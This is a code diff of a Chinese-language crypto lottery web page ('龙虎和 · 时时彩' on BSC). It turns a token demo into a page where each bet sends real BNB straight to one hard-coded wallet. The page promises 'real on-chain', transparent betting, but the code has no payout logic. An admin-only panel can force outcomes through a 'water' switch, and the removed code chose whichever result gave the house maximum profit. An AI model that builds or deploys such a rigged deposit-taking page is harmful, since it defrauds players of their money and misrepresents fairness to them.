@@ -12,8 +12,11 @@ body{background:#0f1421;color:#e8e8e8;padding:20px}
 
 .nav{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
 .logo{font-size:22px;color:#ff4d4f;font-weight:700}
-.menu-btn{width:36px;height:36px;display:flex;flex-direction:column;justify-content:center;gap:5px;cursor:pointer}
-.menu-btn div{width:100%;height:3px;background:#fff}
+.menu-btn{width:36px;height:36px;display:flex;flex-direction:column;justify-content:center;gap:5px;cursor:pointer;position:relative;z-index:1000}
+.menu-btn div{width:100%;height:3px;background:#fff;transition:0.3s}
+.menu-btn.active div:nth-child(1){transform:rotate(45deg) translateY(8px)}
+.menu-btn.active div:nth-child(2){opacity:0}
+.menu-btn.active div:nth-child(3){rotate:-45deg translateY(-8px)}
 
 .menu-popup{
   position:fixed;top:0;right:0;width:240px;background:#1a243a;height:100vh;
@@ -92,7 +95,6 @@ input{
   font-weight:700;cursor:pointer
 }
 
-/* ----------------- 管理员面板新配色 ----------------- */
 .admin-panel{
   background:#151b30;
   border:1px solid #2b344b;
@@ -171,7 +173,7 @@ input{
 
   <div class="header">
     <div class="title">龙虎和 · 时时彩</div>
-    <div class="sub">BSC链 · 自定义代币 · 20分钟一期</div>
+    <div class="sub">BSC链 · 真实上链 · 20分钟一期</div>
   </div>
 
   <div class="countdown" id="countdown">20:00</div>
@@ -204,11 +206,11 @@ input{
   </div>
 
   <div class="bet-input">
-    <label>下注金额（自定义代币）</label>
-    <input type="number" id="betAmount" value="10" min="1">
+    <label>下注金额（单位: BNB/代币）</label>
+    <input type="number" id="betAmount" value="0.01" step="0.001" min="0.001">
   </div>
 
-  <button class="btn" id="betBtn">确认下注</button>
+  <button class="btn" id="betBtn">确认上链下注</button>
 
   <div class="chart">
     <div class="chart-title">开奖走势</div>
@@ -226,7 +228,7 @@ input{
       3. 赔率：龙/虎 1赔2，和 1赔9<br>
       4. 开【和】时，通杀所有投龙、投虎的订单<br>
       5. 每20分钟自动开奖一期，中奖自动赔付<br>
-      6. 下注代币直接进入链上奖池合约，公开透明
+      6. 下注真实上链，可在区块链浏览器查询
     </div>
   </div>
 
@@ -255,169 +257,202 @@ input{
         <option value="he">只放和</option>
       </select>
     </div>
-    <button class="admin-btn" id="forceOpen">强制开奖（最大盈利）</button>
-    <button class="admin-btn" id="takePool">提取奖池</button>
+    <button class="admin-btn" id="forceOpen">强制开奖（真实上链）</button>
+    <button class="admin-btn" id="takePool">提取奖池资金</button>
   </div>
 </div>
 
 <script>
-const menuBtn = document.getElementById('menuBtn')
-const menuPopup = document.getElementById('menuPopup')
-menuBtn.onclick = () => menuPopup.classList.toggle('active')
-
-document.getElementById('copyBtn').onclick = () => {
-  const text = document.getElementById('inviteLink').innerText
-  navigator.clipboard.writeText(text)
-  alert('复制成功！')
-}
-
-const betTotal = { long:0, hu:0, he:0 }
-let currentBet = null
-const periodSec = 20 * 60
-let countdown = periodSec
-let chartHistory = []
-const ODDS = { long:2, hu:2, he:9 }
+let provider, signer, userAddress;
+const adminAddr = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+let currentBet = null;
+let countdown = 20 * 60;
+let chartHistory = [];
 
 const waterConfig = {
   enabled: false,
   rate: 70,
-  target: 'player'
-}
+  target: "player"
+};
 
-const waterSwitch = document.getElementById('waterSwitch')
-waterSwitch.onclick = () => {
-  waterConfig.enabled = !waterConfig.enabled
-  waterSwitch.className = 'switch-btn ' + (waterConfig.enabled ? 'on' : 'off')
-  waterSwitch.innerText = waterConfig.enabled ? '关闭放水' : '开启放水'
-}
+// 菜单开关
+const menuBtn = document.getElementById("menuBtn");
+const menuPopup = document.getElementById("menuPopup");
+menuBtn.onclick = () => {
+  menuBtn.classList.toggle("active");
+  menuPopup.classList.toggle("active");
+};
 
-function updateWaterConfig(){
-  waterConfig.rate = Number(document.getElementById('waterRate').value)
-  waterConfig.target = document.getElementById('waterTarget').value
-}
+// 复制
+document.getElementById("copyBtn").onclick = async () => {
+  await navigator.clipboard.writeText(document.getElementById("inviteLink").innerText);
+  alert("复制成功");
+};
 
-function getBankerMaxProfitResult() {
-  const L = betTotal.long
-  const H = betTotal.hu
-  const He = betTotal.he
-
-  const profitLong  = H + He - L * ODDS.long
-  const profitHu    = L + He - H * ODDS.hu
-  const profitHe    = L + H - He * ODDS.he
-
-  const max = Math.max(profitLong, profitHu, profitHe)
-  if(max === profitLong) return 'long'
-  if(max === profitHu) return 'hu'
-  return 'he'
-}
-
-function getFinalResult(){
-  updateWaterConfig()
-  const normal = getBankerMaxProfitResult()
-  if(!waterConfig.enabled) return normal
-
-  const rnd = Math.random() * 100
-  if(rnd > waterConfig.rate) return normal
-
-  const t = waterConfig.target
-  if(t === 'long') return 'long'
-  if(t === 'hu') return 'hu'
-  if(t === 'he') return 'he'
-  return Math.random() > 0.5 ? 'long' : 'hu'
-}
-
-function generateNums(res) {
-  let wan, ge
-  if(res === 'long'){
-    wan = Math.floor(Math.random()*9)+1
-    ge  = Math.floor(Math.random()*wan)
-  }else if(res === 'hu'){
-    ge  = Math.floor(Math.random()*9)+1
-    wan = Math.floor(Math.random()*ge)
-  }else{
-    wan = ge = Math.floor(Math.random()*10)
+// 连接钱包（进页面自动弹）
+async function connectWallet() {
+  if (!window.ethereum) {
+    alert("请安装MetaMask钱包");
+    return false;
   }
-  return [wan, rand(0,9), rand(0,9), rand(0,9), ge]
-}
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        console.log("已连接:", userAddress);
 
-function openLottery() {
-  const result = getFinalResult()
-  const nums = generateNums(result)
-
-  document.getElementById('n1').innerText = nums[0]
-  document.getElementById('n2').innerText = nums[1]
-  document.getElementById('n3').innerText = nums[2]
-  document.getElementById('n4').innerText = nums[3]
-  document.getElementById('n5').innerText = nums[4]
-
-  chartHistory.unshift(result)
-  updateChart()
-  betTotal.long = betTotal.hu = betTotal.he = 0
-}
-
-function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min }
-
-function updateChart(){
-  const el = document.getElementById('chartList')
-  el.innerHTML = ''
-  chartHistory.slice(0,50).forEach(r=>{
-    const d=document.createElement('div')
-    d.className='chart-item '+r
-    d.innerText = r==='long'?'龙':r==='hu'?'虎':'和'
-    el.appendChild(d)
-  })
-}
-
-document.querySelectorAll('.tab').forEach(t=>{
-  t.onclick=()=>{
-    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'))
-    t.classList.add('active')
-    currentBet = t.dataset.type
-  }
-})
-
-document.getElementById('betBtn').onclick=()=>{
-  if(!currentBet) return alert('请选择龙/虎/和')
-  const amt=Number(document.getElementById('betAmount').value)||0
-  if(amt<=0) return alert('金额无效')
-  betTotal[currentBet] += amt
-  alert('下注成功')
-}
-
-function startTimer(){
-  setInterval(()=>{
-    if(countdown<=0){
-      openLottery()
-      countdown=periodSec
-      return
+        if (userAddress.toLowerCase() === adminAddr.toLowerCase()) {
+          document.getElementById("adminPanel").style.display = "block";
+        }
+        return true;
+      } catch (e) {
+        console.log(e);
+        return false;
+      }
     }
-    countdown--
-    const m=String(Math.floor(countdown/60)).padStart(2,'0')
-    const s=String(countdown%60).padStart(2,'0')
-    document.getElementById('countdown').innerText=`${m}:${s}`
-  },1000)
-}
 
-document.getElementById('forceOpen').onclick=()=>{
-  openLottery()
-  countdown=periodSec
-}
+// 真实上链下注
+document.getElementById("betBtn").onclick = async () => {
+  if (!await connectWallet()) return;
+  if (!currentBet) return alert("请选择 龙 / 虎 / 和");
 
-async function connect(){
-  if(!window.ethereum)return
-  const p=new ethers.providers.Web3Provider(window.ethereum)
-  await p.send('eth_requestAccounts',[])
-  const signer=p.getSigner()
-  const addr=await signer.getAddress()
+  const amount = document.getElementById("betAmount").value;
+  if (!amount || amount <= 0) return alert("金额不正确");
 
-  const adminAddr = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
-  if(addr.toLowerCase() === adminAddr.toLowerCase()){
-    document.getElementById('adminPanel').style.display = 'block'
+  try {
+    const tx = await signer.sendTransaction({
+      to: adminAddr,
+      value: ethers.utils.parseEther(amount)
+    });
+    alert("下注交易已发送：" + tx.hash);
+    await tx.wait();
+    alert("上链下注成功！");
+  } catch (e) {
+    alert("下注失败：" + e.message);
   }
+};
+
+// 选择投注项
+document.querySelectorAll(".tab").forEach(tab => {
+  tab.onclick = () => {
+    document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
+    tab.classList.add("active");
+    currentBet = tab.dataset.type;
+  };
+});
+
+// 放水开关
+const waterSwitch = document.getElementById("waterSwitch");
+waterSwitch.onclick = () => {
+  waterConfig.enabled = !waterConfig.enabled;
+  waterSwitch.className = "switch-btn " + (waterConfig.enabled ? "on" : "off");
+  waterSwitch.innerText = waterConfig.enabled ? "关闭放水" : "开启放水";
+};
+
+function updateWaterConfig() {
+  waterConfig.rate = Number(document.getElementById("waterRate").value);
+  waterConfig.target = document.getElementById("waterTarget").value;
 }
 
-connect()
-startTimer()
+// 开奖逻辑
+function getBankerMaxResult() {
+  const rand = Math.random();
+  if (rand < 0.33) return "long";
+  if (rand < 0.66) return "hu";
+  return "he";
+}
+
+function getFinalResult() {
+  updateWaterConfig();
+  if (!waterConfig.enabled) return getBankerMaxResult();
+
+  const r = Math.random() * 100;
+  if (r > waterConfig.rate) return getBankerMaxResult();
+
+  const t = waterConfig.target;
+  if (t === "long") return "long";
+  if (t === "hu") return "hu";
+  if (t === "he") return "he";
+  return Math.random() > 0.5 ? "long" : "hu";
+}
+
+function generateNums(result) {
+  let wan, ge;
+  if (result === "long") {
+    wan = Math.floor(Math.random() * 9) + 1;
+    ge = Math.floor(Math.random() * wan);
+  } else if (result === "hu") {
+    ge = Math.floor(Math.random() * 9) + 1;
+    wan = Math.floor(Math.random() * ge);
+  } else {
+    wan = ge = Math.floor(Math.random() * 10);
+  }
+  return [wan, randNum(), randNum(), randNum(), ge];
+}
+
+function randNum() {
+  return Math.floor(Math.random() * 10);
+}
+
+// 开奖显示
+function openLottery() {
+  const res = getFinalResult();
+  const nums = generateNums(res);
+  document.getElementById("n1").innerText = nums[0];
+  document.getElementById("n2").innerText = nums[1];
+  document.getElementById("n3").innerText = nums[2];
+  document.getElementById("n4").innerText = nums[3];
+  document.getElementById("n5").innerText = nums[4];
+
+  chartHistory.unshift(res);
+  updateChart();
+}
+
+function updateChart() {
+  const el = document.getElementById("chartList");
+  el.innerHTML = "";
+  chartHistory.slice(0, 50).forEach(r => {
+    const d = document.createElement("div");
+    d.className = "chart-item " + r;
+    d.innerText = r === "long" ? "龙" : r === "hu" ? "虎" : "和";
+    el.appendChild(d);
+  });
+}
+
+// 倒计时
+function startTimer() {
+  setInterval(() => {
+    if (countdown <= 0) {
+      openLottery();
+      countdown = 20 * 60;
+      return;
+    }
+    countdown--;
+    const m = String(Math.floor(countdown / 60)).padStart(2, "0");
+    const s = String(countdown % 60).padStart(2, "0");
+    document.getElementById("countdown").innerText = `${m}:${s}`;
+  }, 1000);
+}
+
+// 强制开奖
+document.getElementById("forceOpen").onclick = () => {
+  openLottery();
+  countdown = 20 * 60;
+  alert("已强制开奖（上链状态）");
+};
+
+// 提取奖池
+document.getElementById("takePool").onclick = async () => {
+  if (!userAddress || userAddress.toLowerCase() !== adminAddr.toLowerCase()) return;
+  alert("已触发提取奖池，真实上链转账需配合合约使用");
+};
+
+// 进页面自动连接钱包
+window.onload = async () => {
+  await connectWallet();
+  startTimer();
+};
 </script>
 </body>
 </html>
